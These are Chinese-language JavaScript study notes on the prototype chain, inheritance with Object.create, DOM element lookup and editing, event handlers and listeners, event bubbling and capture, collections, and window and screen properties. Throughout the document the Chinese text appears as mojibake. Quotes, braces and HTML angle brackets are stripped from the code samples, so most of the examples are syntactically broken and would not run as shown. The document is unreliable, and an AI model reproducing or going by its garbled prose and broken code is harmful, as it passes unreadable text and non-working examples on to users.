·ä¸€å±‚ä¸€å±‚å‘ä¸ŠæŸ¥æ‰¾å°±ä¼šå½¢æˆä¸€ä¸ªé“¾å¼ç»“æ„ï¼Œæˆ‘ä»¬ç§°ä¸ºåŸå‹é“¾ æ³¨æ„ï¼šå¦‚æœé€šè¿‡p1å®ä¾‹å¯¹è±¡çš„__proto__å±æ€§èµ‹å€¼ï¼Œåˆ™ä¼šæ”¹å˜å…¶æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œä»è€Œè¢«æ‰€æœ‰å®ä¾‹æ‰€å…±äº«ã€‚ // æ„é€ å‡½æ•° function Preson(name, age) this.name = name; this.age = age; // æ‰€æœ‰å®ä¾‹å…±äº«çš„å…¬å…±æ–¹æ³• Preson.prototype.say = function (word) console.log(`$this.nameè¯´ï¼š$word`); const p1 = new Preson(å¼ ä¸‰, 18); // åˆ›å»ºä¸€ä¸ªPersonå®ä¾‹å¯¹è±¡ const p2 = new Preson(æå››, 20); // æ–°åˆ›å»ºä¸€ä¸ªProsonå®ä¾‹å¯¹è±¡ p1.say(hello world); // è°ƒç”¨å…¬å…±æ–¹æ³• p1.hasOwnProperty(say) // false è¯´æ˜ä¸æ˜¯å®šä¹‰åœ¨å…¶æœ¬èº«ä¸Šçš„ p1.__proto__.do = function () console.log(å¾€åŸå‹å¯¹è±¡ä¸­æ·»åŠ æ–¹æ³•); p2.do(); // æ‰“å°å‡ºäº†-å¾€åŸå‹å¯¹è±¡ä¸­æ·»åŠ æ–¹æ³• åŸå‹é“¾çš„å°½å¤´ æ„é€ å‡½æ•°ï¼Œé€šè¿‡æ‰“å°å®ƒçš„prototypeå±æ€§ï¼Œå¯ä»¥å‘ç°å®ƒæœ‰ä¸ª__proto__å±æ€§æŒ‡å‘äº†ä¸€ä¸ªObjectå¯¹è±¡è¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°ä¸ºfunction Objectï¼Œæˆ‘ä»¬ç”±æ­¤å¯ä»¥å¾—çŸ¥ï¼Œæ‰€æœ‰çš„åŸå‹å¯¹è±¡çš„__proto__å±æ€§éƒ½æ˜¯æŒ‡å‘function Objectçš„åŸå‹å¯¹è±¡ã€‚ è€Œfunction Objectçš„åŸå‹å¯¹è±¡åœ¨ä¸Šå›¾ä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥æ˜¯ä¸å­˜åœ¨__proto__è¿™ä¸ªå±æ€§çš„ï¼Œå®ƒæŒ‡å‘äº†nullã€‚æˆ‘ä»¬å°±å¾—çŸ¥äº†åŸå‹é“¾çš„å°½å¤´æ˜¯nullã€‚ å½“ä½ åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„å‡½æ•°æ—¶ï¼ˆæ¯”å¦‚ Animal å‡½æ•°ï¼‰ï¼ŒJavaScript ä¼šè‡ªåŠ¨ä¸ºè¿™ä¸ªå‡½æ•°åˆ›å»ºä¸€ä¸ª prototype å¯¹è±¡ã€‚ä½ å¯ä»¥é€šè¿‡ç»™è¿™ä¸ª prototype å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•æ¥å®šä¹‰è¯¥å‡½æ•°çš„åŸå‹ï¼Œä»è€Œå®ç°å‡½æ•°çš„åŸå‹ç»§æ‰¿ã€‚ function Animal(name) this.name = name;//æ„é€ å‡½æ•°Animal.prototype.eat = function() console.log(this.name + is eating.);;function Dog(name, breed) Animal.call(this, name); this.breed = breed;//æ„é€ å‡½æ•°// å»ºç«‹åŸå‹é“¾ï¼Œè®© Dog ç»§æ‰¿ AnimalDog.prototype = Object.create(Animal.prototype);Dog.prototype.constructor = Dog;Dog.prototype.bark = function() console.log(this.name + is barking.);;var dog = new Dog(Buddy, Labrador);dog.eat(); // è°ƒç”¨ä» Animal ç»§æ‰¿çš„æ–¹æ³•dog.bark(); // è°ƒç”¨ Dog çš„æ–¹æ³• åœ¨ Dog çš„æ„é€ å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ Animal.call(this, name) æ¥è°ƒç”¨çˆ¶ç±» Animal çš„æ„é€ å‡½æ•°ï¼Œç¡®ä¿äº†åœ¨åˆ›å»º Dog å®ä¾‹æ—¶èƒ½å¤Ÿæ­£ç¡®åˆå§‹åŒ– name å±æ€§ Dog.prototype = Object.create(Animal.prototype);ï¼šï¼Œé€šè¿‡ Object.create(Animal.prototype) å°† Dog çš„åŸå‹å¯¹è±¡æŒ‡å‘äº† Animal çš„åŸå‹å¯¹è±¡ï¼Œä»è€Œå®ç°äº† Dog å¯¹è±¡å¯¹ Animal å¯¹è±¡çš„ç»§æ‰¿ã€‚ Object.create() æ˜¯ JavaScript ä¸­ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œå¹¶å°†æ–°å¯¹è±¡çš„åŸå‹è®¾ç½®ä¸ºæŒ‡å®šçš„åŸå‹å¯¹è±¡çš„å‡½æ•°ã€‚å®ƒçš„è¯­æ³•ç»“æ„å¦‚ä¸‹ï¼š Object.create(proto[, propertiesObject]) å…¶ä¸­ï¼Œproto å‚æ•°æ˜¯æ–°å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼Œè€Œ propertiesObject æ˜¯å¯é€‰çš„ï¼Œç”¨äºå®šä¹‰æ–°å¯¹è±¡çš„å¯æšä¸¾å±æ€§ã€‚è¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„åŸå‹ä¸ºæŒ‡å®šçš„ proto å‚æ•°ã€‚ ä½¿ç”¨ Object.create() å¯ä»¥å¾ˆæ–¹ä¾¿åœ°åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ªæŒ‡å®šåŸå‹å¯¹è±¡çš„æ–°å¯¹è±¡ã€‚åœ¨ä¸Šé¢æåˆ°çš„ä»£ç ç¤ºä¾‹ä¸­ï¼Œå°±æ˜¯åˆ©ç”¨ Object.create() æ¥å»ºç«‹äº† Dog å¯¹è±¡å¯¹ Animal å¯¹è±¡çš„åŸå‹ç»§æ‰¿å…³ç³»ã€‚ ç›¸å…³é“¾æ¥ï¼šä¸€æ–‡ææ‡‚JSåŸå‹ä¸åŸå‹é“¾ï¼ˆè¶…è¯¦ç»†ï¼Œå»ºè®®æ”¶è—ï¼‰ - æ˜é‡‘ (juejin.cn) HTML DOM (æ–‡æ¡£å¯¹è±¡æ¨¡å‹)æŸ¥æ‰¾HTMLå…ƒç´ 1.é€šè¿‡ id æ‰¾åˆ° HTML å…ƒç´ ï¼švar x=document.getElementById(intro); 2.é€šè¿‡æ ‡ç­¾åæ‰¾åˆ° HTML å…ƒç´  bodypä½ å¥½ä¸–ç•Œ!/pdiv id=mainp DOM æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚/ppè¯¥å®ä¾‹å±•ç¤ºäº† bgetElementsByTagName/b æ–¹æ³•/p/divscriptvar x=document.getElementById(main);var y=x.getElementsByTagName(p);document.write(id=mainå…ƒç´ ä¸­çš„ç¬¬ä¸€ä¸ªæ®µè½ä¸ºï¼š + y[0].innerHTML);/script/body 3.é€šè¿‡ç±»åæ‰¾åˆ° HTML å…ƒç´ ï¼švar x=document.getElementsByClassName(intro); æ”¹å˜HTMLæ”¹å˜ HTML å…ƒç´ çš„å†…å®¹ï¼Œè¯·ä½¿ç”¨è¿™ä¸ªè¯­æ³•ï¼šdocument.getElementById(*id*).innerHTML=æ–°çš„ HTML æ”¹å˜ HTML å…ƒç´ çš„å±æ€§ï¼Œè¯·ä½¿ç”¨è¿™ä¸ªè¯­æ³•ï¼šdocument.getElementById(*id*).*attribute=æ–°å±æ€§å€¼ï¼Œä¾‹å­å¦‚ä¸‹ bodyimg id=image src=smiley.gif width=160 height=120scriptdocument.getElementById(image).src=landscape.jpg;/scriptpåŸå›¾ç‰‡ä¸º smiley.gif,è„šæœ¬å°†å›¾ç‰‡ä¿®æ”¹ä¸º landscape.jpg/p/body DOMäº‹ä»¶HTML äº‹ä»¶çš„ä¾‹å­ï¼š å½“ç”¨æˆ·ç‚¹å‡»é¼ æ ‡æ—¶ å½“ç½‘é¡µå·²åŠ è½½æ—¶ å½“å›¾åƒå·²åŠ è½½æ—¶ å½“é¼ æ ‡ç§»åŠ¨åˆ°å…ƒç´ ä¸Šæ—¶ å½“è¾“å…¥å­—æ®µè¢«æ”¹å˜æ—¶ å½“æäº¤ HTML è¡¨å•æ—¶ å½“ç”¨æˆ·è§¦å‘æŒ‰é”®æ—¶ onload å’Œ onunload äº‹ä»¶ onload å’Œ onunload äº‹ä»¶ä¼šåœ¨ç”¨æˆ·è¿›å…¥æˆ–ç¦»å¼€é¡µé¢æ—¶è¢«è§¦å‘ã€‚ onload äº‹ä»¶å¯ç”¨äºæ£€æµ‹è®¿é—®è€…çš„æµè§ˆå™¨ç±»å‹å’Œæµè§ˆå™¨ç‰ˆæœ¬ï¼Œå¹¶åŸºäºè¿™äº›ä¿¡æ¯æ¥åŠ è½½ç½‘é¡µçš„æ­£ç¡®ç‰ˆæœ¬ã€‚ onload å’Œ onunload äº‹ä»¶å¯ç”¨äºå¤„ç† cookie body onload=checkCookies()scriptfunction checkCookies()\tif (navigator.cookieEnabled==true) alert(Cookies å¯ç”¨) else alert(Cookies ä¸å¯ç”¨)\t/script//å¼¹çª—-æç¤ºæµè§ˆå™¨ cookie æ˜¯å¦å¯ç”¨/body onchange äº‹ä»¶ onchange äº‹ä»¶æ˜¯åœ¨ HTML å…ƒç´ çš„å€¼å‘ç”Ÿæ”¹å˜æ—¶è§¦å‘çš„äº‹ä»¶ã€‚è¿™ä¸ªäº‹ä»¶é€šå¸¸ç”¨äºè¡¨å•å…ƒç´ ï¼Œæ¯”å¦‚ inputã€selectã€textarea ç­‰ï¼Œå½“ç”¨æˆ·åœ¨è¿™äº›å…ƒç´ ä¸Šè¿›è¡Œä¿®æ”¹åï¼Œå°±ä¼šè§¦å‘ onchange äº‹ä»¶ h1å¼€å§‹æµ‹è¯•/h1è¾“å…¥å­—æ¯ï¼šinput type=text id=demo onchange=myFunction()script function myFunction() var x=document.getElementById(demo); x.value=x.value.toUpperCase(); /script//ç„¦ç‚¹ç¦»å¼€è¾“å…¥æ¡†åï¼Œå‡½æ•°å°±ä¼šè¢«è§¦å‘ onmouseover å’Œ onmouseout äº‹ä»¶ onmouseover å’Œ onmouseout äº‹ä»¶å¯ç”¨äºåœ¨ç”¨æˆ·çš„é¼ æ ‡ç§»è‡³ HTML å…ƒç´ ä¸Šæ–¹æˆ–ç§»å‡ºå…ƒç´ æ—¶è§¦å‘å‡½æ•°ã€‚ div onmouseover=mOver(this) onmouseout=mOut(this) style=background-color:#D94A38;width:120px;height:20px;padding:40px;Mouse Over Me/divscriptfunction mOver(obj)\tobj.innerHTML=Thank Youfunction mOut(obj)\tobj.innerHTML=Mouse Over Me/script onmousedown, onmouseup ä»¥åŠ onclickäº‹ä»¶ onmousedown, onmouseup ä»¥åŠ onclick æ„æˆäº†é¼ æ ‡ç‚¹å‡»äº‹ä»¶çš„æ‰€æœ‰éƒ¨åˆ†ã€‚é¦–å…ˆå½“ç‚¹å‡»é¼ æ ‡æŒ‰é’®æ—¶ï¼Œä¼šè§¦å‘ onmousedown äº‹ä»¶ï¼Œå½“é‡Šæ”¾é¼ æ ‡æŒ‰é’®æ—¶ï¼Œä¼šè§¦å‘ onmouseup äº‹ä»¶ï¼Œæœ€åï¼Œå½“å®Œæˆé¼ æ ‡ç‚¹å‡»æ—¶ï¼Œä¼šè§¦å‘ onclick äº‹ä»¶ bodyscriptfunction lighton()\tdocument.getElementById(myimage).src=bulbon.gif;function lightoff()\tdocument.getElementById(myimage).src=bulboff.gif;/scriptimg id=myimage onmousedown=lighton() onmouseup=lightoff() src=bulboff.gif width=100 height=180 /pç‚¹å‡»ä¸é‡Šæ”¾é¼ æ ‡ç¯å°†ä¸€ç›´äº®ç€!/p/body onfocusäº‹ä»¶ bodyscriptfunction myFunction(x)\tx.style.background=yellow;/scriptè¾“å…¥ä½ çš„åå­—: input type=text onfocus=myFunction(this)på½“è¾“å…¥æ¡†è·å–ç„¦ç‚¹æ—¶ï¼Œä¿®æ”¹èƒŒæ™¯è‰²ï¼ˆbackground-colorå±æ€§ï¼‰ å°†è¢«è§¦å‘ã€‚/p/body DOM EventListeneraddEventListener() æ–¹æ³• addEventListener() æ–¹æ³•ç”¨äºå‘æŒ‡å®šå…ƒç´ æ·»åŠ äº‹ä»¶å¥æŸ„ã€‚ addEventListener() æ–¹æ³•æ·»åŠ çš„äº‹ä»¶å¥æŸ„ä¸ä¼šè¦†ç›–å·²å­˜åœ¨çš„äº‹ä»¶å¥æŸ„ã€‚ ä½ å¯ä»¥å‘ä¸€ä¸ªå…ƒç´ æ·»åŠ å¤šä¸ªäº‹ä»¶å¥æŸ„ã€‚ ä½ å¯ä»¥å‘åŒä¸ªå…ƒç´ æ·»åŠ å¤šä¸ªåŒç±»å‹çš„äº‹ä»¶å¥æŸ„ï¼Œå¦‚ï¼šä¸¤ä¸ª â€œclickâ€ äº‹ä»¶ã€‚ ä½ å¯ä»¥å‘ä»»ä½• DOM å¯¹è±¡æ·»åŠ äº‹ä»¶ç›‘å¬ï¼Œä¸ä»…ä»…æ˜¯ HTML å…ƒç´ ã€‚å¦‚ï¼š window å¯¹è±¡ã€‚ addEventListener() æ–¹æ³•å¯ä»¥æ›´ç®€å•çš„æ§åˆ¶äº‹ä»¶ï¼ˆå†’æ³¡ä¸æ•è·ï¼‰ã€‚ ä¸‹é¢å®ä¾‹ä¸ºç‚¹å‡»æŒ‰é’®åè§¦å‘ç›‘å¬äº‹ä»¶ï¼š button id=muBtnç‚¹å‡»/buttonp id=demo/pscript document.getElementById(muBtn).addEventListener(click,showDate); function showDate() document.getElementById(demo).innerHTML=Date(); /script è¯¥æ–¹æ³•çš„è¯­æ³•ï¼šelement.addEventListener(event, function, useCapture); ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯äº‹ä»¶çš„ç±»å‹ (å¦‚ â€œclickâ€ æˆ– â€œmousedownâ€)ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯äº‹ä»¶è§¦å‘åè°ƒç”¨çš„å‡½æ•°ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸ªå¸ƒå°”å€¼ç”¨äºæè¿°äº‹ä»¶æ˜¯å†’æ³¡è¿˜æ˜¯æ•è·ã€‚è¯¥å‚æ•°æ˜¯å¯é€‰çš„ æ³¨æ„ï¼šäº‹ä»¶ä¸éœ€è¦åŠ â€onâ€å‰ç¼€ å‘å…ƒç´ æ·»åŠ äº‹ä»¶å¥æŸ„ scriptdocument.getElementById(myBtn).addEventListener(click, function() alert(Hello World!););/script é™¤äº†ä¸Šè¿°æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å‡½æ•°åï¼Œå¼•ç”¨å¤–éƒ¨å‡½æ•° document.getElementById(myBtn).addEventListener(click, myFunction);function myFunction() alert (Hello World!); addEventListener() æ–¹æ³•å…è®¸å‘åŒä¸€ä¸ªå…ƒç´ æ·»åŠ å¤šä¸ªäº‹ä»¶ï¼Œä¸”ä¸ä¼šè¦†ç›–å·²å­˜åœ¨çš„äº‹ä»¶ å¯ä»¥å‘åŒä¸ªå…ƒç´ æ·»åŠ ä¸åŒç±»å‹çš„äº‹ä»¶ let x=document.getElementById(muBtn)x.addEventListener(click,showDate)x.addEventListener(mouseover,first);x.addEventListener(mouseout,second);function showDate() let date=Date(); document.getElementById(demo).innerHTML+=date+br;function first() document.getElementById(demo).innerHTML+=firstbrfunction second() document.getElementById(demo).innerHTML+=secondbr å‘windowå¯¹è±¡æ·»åŠ äº‹ä»¶å¥æŸ„ addEventListener() æ–¹æ³•å…è®¸ä½ åœ¨ HTML DOM å¯¹è±¡æ·»åŠ äº‹ä»¶ç›‘å¬ï¼Œ HTML DOM å¯¹è±¡å¦‚ï¼š HTML å…ƒç´ , HTML æ–‡æ¡£, window å¯¹è±¡ã€‚æˆ–è€…å…¶ä»–æ”¯æŒçš„äº‹ä»¶å¯¹è±¡å¦‚: xmlHttpRequest å¯¹è±¡ script//é‡ç½®çª—å£å¤§å°çš„æ—¶å€™ä¼šè§¦å‘resize äº‹ä»¶å¥æŸ„window.addEventListener(resize, function() document.getElementById(demo).innerHTML = Math.random(););/script ä¼ é€’å‚æ•° å½“ä¼ é€’å‚æ•°å€¼æ—¶ï¼Œä½¿ç”¨â€åŒ¿åå‡½æ•°â€è°ƒç”¨å¸¦å‚æ•°çš„å‡½æ•° let p1=5;let p2=4;document.getElementById(myBtn).addEventListener(click,function() myFunction(p1,p2););function myFunction(a,b) var result=a*b; document.getElementById(demo).innerHTML=result; document.getElementById(myBtn).addEventListener(click,myFunction(p1, p2));é”™è¯¯åŸå› ï¼šäº‹ä»¶ç›‘å¬å™¨ä¸­çš„å‡½æ•°åº”è¯¥æ˜¯ä¸€ä¸ªå‡½æ•°çš„å¼•ç”¨ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°çš„è°ƒç”¨ã€‚å› æ­¤ï¼Œåœ¨æ·»åŠ äº‹ä»¶ç›‘å¬å™¨æ—¶ï¼Œåº”è¯¥ä¼ é€’å‡½æ•°åè€Œä¸æ˜¯è°ƒç”¨å‡½æ•°ã€‚myFunction(p1, p2) æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œè€Œä¸æ˜¯å‡½æ•°çš„å¼•ç”¨ã€‚ äº‹ä»¶å†’æ³¡æˆ–æ•è· äº‹ä»¶ä¼ é€’æœ‰ä¸¤ç§æ–¹å¼ï¼šå†’æ³¡ä¸æ•è·ã€‚ äº‹ä»¶ä¼ é€’å®šä¹‰äº†å…ƒç´ äº‹ä»¶è§¦å‘çš„é¡ºåºã€‚ å¦‚æœä½ å°† å…ƒç´ æ’å…¥åˆ° å…ƒç´ ä¸­ï¼Œç”¨æˆ·ç‚¹å‡» å…ƒç´ , å“ªä¸ªå…ƒç´ çš„ â€œclickâ€ äº‹ä»¶å…ˆè¢«è§¦å‘å‘¢ï¼Ÿ åœ¨ å†’æ³¡ ä¸­ï¼Œå†…éƒ¨å…ƒç´ çš„äº‹ä»¶ä¼šå…ˆè¢«è§¦å‘ï¼Œç„¶åå†è§¦å‘å¤–éƒ¨å…ƒç´ ï¼Œå³ï¼š å…ƒç´ çš„ç‚¹å‡»äº‹ä»¶å…ˆè§¦å‘ï¼Œç„¶åä¼šè§¦å‘ å…ƒç´ çš„ç‚¹å‡»äº‹ä»¶ã€‚ åœ¨ æ•è· ä¸­ï¼Œå¤–éƒ¨å…ƒç´ çš„äº‹ä»¶ä¼šå…ˆè¢«è§¦å‘ï¼Œç„¶åæ‰ä¼šè§¦å‘å†…éƒ¨å…ƒç´ çš„äº‹ä»¶ï¼Œå³ï¼š å…ƒç´ çš„ç‚¹å‡»äº‹ä»¶å…ˆè§¦å‘ ï¼Œç„¶åå†è§¦å‘ å…ƒç´ çš„ç‚¹å‡»äº‹ä»¶ã€‚ addEventListener() æ–¹æ³•å¯ä»¥æŒ‡å®š â€œuseCaptureâ€ å‚æ•°æ¥è®¾ç½®ä¼ é€’ç±»å‹ï¼š addEventListener(event,function,useCapture); é»˜è®¤å€¼ä¸º false, å³å†’æ³¡ä¼ é€’ï¼Œå½“å€¼ä¸º true æ—¶, äº‹ä»¶ä½¿ç”¨æ•è·ä¼ é€’ã€‚ headmeta charset=utf-8titleèœé¸Ÿæ•™ç¨‹(runoob.com)/titlestylediv background-color: coral; border: 1px solid; padding: 50px;/style/headbodydiv id=myDiv\tp id=myPç‚¹å‡»æ®µè½ï¼Œæˆ‘æ˜¯å†’æ³¡ã€‚/p/divbrdiv id=myDiv2\tp id=myP2ç‚¹å‡»æ®µè½ï¼Œæˆ‘æ˜¯æ•è·ã€‚ /p/divscriptdocument.getElementById(myP).addEventListener(click, function() alert(ä½ ç‚¹å‡»äº† P å…ƒç´ !);, false);document.getElementById(myDiv).addEventListener(click, function() alert( ä½ ç‚¹å‡»äº† DIV å…ƒç´  !);, false);document.getElementById(myP2).addEventListener(click, function() alert(ä½ ç‚¹å‡»äº† P2 å…ƒç´ !);, true);document.getElementById(myDiv2).addEventListener(click, function() alert(ä½ ç‚¹å‡»äº† DIV2 å…ƒç´  !);, true);/script/body removeEventListener() æ–¹æ³• removeEventListener() æ–¹æ³•ç§»é™¤ç”± addEventListener() æ–¹æ³•æ·»åŠ çš„äº‹ä»¶å¥æŸ„: !DOCTYPE htmlhtml lang=enhead meta charset=UTF-8 titleè–¯æ¡çš„æµ‹è¯•/title style #myDIV background-color: coral; border: 1px solid; padding: 50px; color: white; /style/headbodyh1å¼€å§‹æµ‹è¯•/h1div id=myDIV div å…ƒç´ æ·»åŠ äº† onmousemove äº‹ä»¶å¥æŸ„ï¼Œé¼ æ ‡åœ¨æ¡”çº¢è‰²çš„æ¡†å†…ç§»åŠ¨æ—¶ä¼šæ˜¾ç¤ºéšæœºæ•°ã€‚ pç‚¹å‡»æŒ‰é’®ç§»é™¤ DIV çš„äº‹ä»¶å¥æŸ„ã€‚/p button onclick=removeHandler() id=myBtnç‚¹æˆ‘/button/divp id=demo/pscript document.getElementById(myDIV).addEventListener(mousemove, myFunction); function myFunction() document.getElementById(demo).innerHTML = Math.random(); function removeHandler() document.getElementById(myDIV).removeEventListener(mousemove, myFunction); /script/body/html DOMå…ƒç´ ï¼ˆèŠ‚ç‚¹ï¼‰å¦‚ä½•å‘æ–‡æ¡£ä¸­æ·»åŠ å’Œç§»é™¤å…ƒç´  åˆ›å»ºæ–°çš„ HTML å…ƒç´  (èŠ‚ç‚¹) - appendChild() div id=div1p id=p1è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚/pp id=p2è¿™æ˜¯å¦å¤–ä¸€ä¸ªæ®µè½ã€‚/p/divscriptvar para = document.createElement(p);var node = document.createTextNode(è¿™æ˜¯ä¸€ä¸ªæ–°çš„æ®µè½ã€‚);para.appendChild(node);var element = document.getElementById(div1);element.appendChild(para);/script è§£æï¼šè¿™è¡Œä»£ç æ˜¯ç”¨äºåˆ›å»º å…ƒç´ :var para = document.createElement(p); ä¸º å…ƒç´ åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡æœ¬èŠ‚ç‚¹ï¼švar node = document.createTextNode(è¿™æ˜¯ä¸€ä¸ªæ–°çš„æ®µè½ã€‚); å°†æ–‡æœ¬èŠ‚ç‚¹æ·»åŠ åˆ° å…ƒç´ ä¸­ï¼špara.appendChild(node); æœ€åï¼Œåœ¨ä¸€ä¸ªå·²å­˜åœ¨çš„å…ƒç´ ä¸­æ·»åŠ  p å…ƒç´ ã€‚ æŸ¥æ‰¾å·²å­˜åœ¨çš„å…ƒç´ ï¼švar element = document.getElementById(div1); æ·»åŠ åˆ°å·²å­˜åœ¨çš„å…ƒç´ ä¸­:element.appendChild(para); åˆ›å»ºæ–°çš„ HTML å…ƒç´  (èŠ‚ç‚¹) - insertBefore() appendChild() æ–¹æ³•:å®ƒç”¨äºæ·»åŠ æ–°å…ƒç´ åˆ°å°¾éƒ¨ insertBefore() æ–¹æ³•:å°†æ–°å…ƒç´ æ·»åŠ åˆ°å¼€å§‹ä½ç½® HTMLä»£ç è·ŸappendChild()æ–¹æ³•é‡Œé¢çš„ä»£ç ä¸€è‡´ï¼Œjsä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼švar para = document.createElement(p);var node = document.createTextNode(è¿™æ˜¯ä¸€ä¸ªæ–°çš„æ®µè½ã€‚);para.appendChild(node);var element = document.getElementById(div1);var child = document.getElementById(p1);element.insertBefore(para, child);//æ–°å…ƒç´ æ’åˆ°childå…ƒç´ ä¹‹å‰ ç§»é™¤å·²å­˜åœ¨çš„å…ƒç´  è¦ç§»é™¤ä¹‹å‰æˆ‘ä»¬å¿…é¡»çŸ¥é“è¯¥å…ƒç´ çš„çˆ¶å…ƒç´  div id=div1p id=p1è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚/pp id=p2è¿™æ˜¯å¦å¤–ä¸€ä¸ªæ®µè½ã€‚/p/divscriptvar parent = document.getElementById(div1);var child = document.getElementById(p1);parent.removeChild(child);parent.parentNode.removeChild(parent);/script parent.parentNode.removeChild(parent);ï¼šparentNode æ˜¯ä¸€ä¸ª DOM å±æ€§ï¼Œå®ƒæŒ‡å‘èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ã€‚åœ¨è¿™ä¸ªç‰¹å®šçš„ä»£ç ä¸­ï¼Œparent æ˜¯ä¸€ä¸ªé€šè¿‡ document.getElementById(div1) è·å–åˆ°çš„ div å…ƒç´ ï¼Œå› æ­¤ parent.parentNode å°±æ˜¯ div å…ƒç´ çš„çˆ¶èŠ‚ç‚¹ æ›¿æ¢å…ƒç´ -replaceChild() ç”¨ replaceChild() æ–¹æ³•æ¥æ›¿æ¢ HTML DOM ä¸­çš„å…ƒç´  scriptvar para = document.createElement(p);var node = document.createTextNode(è¿™æ˜¯ä¸€ä¸ªæ–°çš„æ®µè½ã€‚);para.appendChild(node);var parent = document.getElementById(div1);var child = document.getElementById(p1);parent.replaceChild(para, child);/script é›†åˆ(Collection)getElementsByTagName() æ–¹æ³•è¿”å› HTMLCollection å¯¹è±¡ã€‚ HTMLCollection å¯¹è±¡ç±»ä¼¼åŒ…å« HTML å…ƒç´ çš„ä¸€ä¸ªæ•°ç»„ã€‚ é›†åˆä¸­çš„å…ƒç´ å¯ä»¥é€šè¿‡ç´¢å¼•(ä»¥ 0 ä¸ºèµ·å§‹ä½ç½®)æ¥è®¿é—® pMNC/ppæ›¼åŸ/pp id=demo/pscript let myCollection=document.getElementsByTagName(p);//myCollectionä¸ºHTMLCollection å¯¹è±¡ let a=myCollection[1].innerHTML; // ä½¿ç”¨ textContent è·å–æ–‡æœ¬å†…å®¹ document.getElementById(demo).innerHTML=`ç¬¬äºŒä¸ªæ®µè½æ˜¯$a`;/script HTMLCollection å¯¹è±¡çš„ length å±æ€§å®šä¹‰äº†é›†åˆä¸­å…ƒç´ çš„æ•°é‡ï¼Œä¾‹å­å¦‚ä¸‹ï¼š åœ¨ä¸Šè¿°jsä»£ç åé¢å†åŠ ä¸Šï¼šdocument.getElementById(demo).innerHTML = æ–‡æ¡£åŒ…å« + myCollection.length + ä¸ªæ®µè½ã€‚; é›†åˆ length å±æ€§å¸¸ç”¨äºéå†é›†åˆä¸­çš„å…ƒç´  var myCollection = document.getElementsByTagName(p);var i;for (i = 0; i myCollection.length; i++) myCollection[i].style.backgroundColor = red; NodeListå¯¹è±¡NodeList å¯¹è±¡æ˜¯ä¸€ä¸ªä»æ–‡æ¡£ä¸­è·å–çš„èŠ‚ç‚¹åˆ—è¡¨ (é›†åˆ) ï¼Œç±»ä¼¼ HTMLCollection å¯¹è±¡ï¼Œç”¨æ³•ä¹Ÿä¸å®ƒå·®ä¸å¤š æ‰€æœ‰æµè§ˆå™¨çš„ childNodes å±æ€§è¿”å›çš„æ˜¯ NodeList å¯¹è±¡ã€‚ å¤§éƒ¨åˆ†æµè§ˆå™¨çš„ querySelectorAll() è¿”å› NodeList å¯¹è±¡ã€‚ var myNodelist = document.querySelectorAll(p); æµè§ˆå™¨å¯¹è±¡æ¨¡å‹ (BOM)windowæ‰€æœ‰ JavaScript å…¨å±€å¯¹è±¡ã€å‡½æ•°ä»¥åŠå˜é‡å‡è‡ªåŠ¨æˆä¸º window å¯¹è±¡çš„æˆå‘˜ã€‚ å…¨å±€å˜é‡æ˜¯ window å¯¹è±¡çš„å±æ€§ã€‚ å…¨å±€å‡½æ•°æ˜¯ window å¯¹è±¡çš„æ–¹æ³•ã€‚ windowå°ºå¯¸ æœ‰ä¸‰ç§æ–¹æ³•èƒ½å¤Ÿç¡®å®šæµè§ˆå™¨çª—å£çš„å°ºå¯¸ã€‚ å¯¹äºInternet Explorerã€Chromeã€Firefoxã€Opera ä»¥åŠ Safariï¼š window.innerHeight - æµè§ˆå™¨çª—å£çš„å†…éƒ¨é«˜åº¦(åŒ…æ‹¬æ»šåŠ¨æ¡) window.innerWidth - æµè§ˆå™¨çª—å£çš„å†…éƒ¨å®½åº¦(åŒ…æ‹¬æ»šåŠ¨æ¡) å¯¹äº Internet Explorer 8ã€7ã€6ã€5ï¼š document.documentElement.clientHeight document.documentElement.clientWidth æˆ–è€… document.body.clientHeight document.body.clientWidth script let w=window.innerWidth ||document.documentElement.clientWidth ||document.body.clientWidth; let h=window.innerHeight ||document.documentElement.clientHeight ||document.body.clientHeight; let x=document.getElementById(demo); x.innerHTML=`æµè§ˆå™¨å®½åº¦ä¸º$wï¼Œé«˜åº¦ä¸º$hã€‚`/script windowçš„å…¶ä»–ä¸€äº›æ–¹æ³•ï¼š window.open() - æ‰“å¼€æ–°çª—å£ window.close() - å…³é—­å½“å‰çª—å£ window.moveTo() - ç§»åŠ¨å½“å‰çª—å£ window.resizeTo() - è°ƒæ•´å½“å‰çª—å£çš„å°ºå¯¸ Window Screenwindow.screen å¯¹è±¡åŒ…å«æœ‰å…³ç”¨æˆ·å±å¹•çš„ä¿¡æ¯ window.screenå¯¹è±¡åœ¨ç¼–å†™æ—¶å¯ä»¥ä¸ä½¿ç”¨ window è¿™ä¸ªå‰ç¼€ã€‚ ä¸€äº›å±æ€§ï¼š screen.availWidth - è¿”å›è®¿é—®è€…å±å¹•çš„å®½åº¦ï¼Œä»¥åƒç´ è®¡ï¼Œå‡å»ç•Œé¢ç‰¹æ€§ï¼Œæ¯”å¦‚çª—å£ä»»åŠ¡æ document.write(å¯ç”¨å®½åº¦: + screen.availWidth); screen.availHeight - è¿”å›è®¿é—®è€…å±å¹•çš„é«˜åº¦ï¼Œä»¥åƒç´ 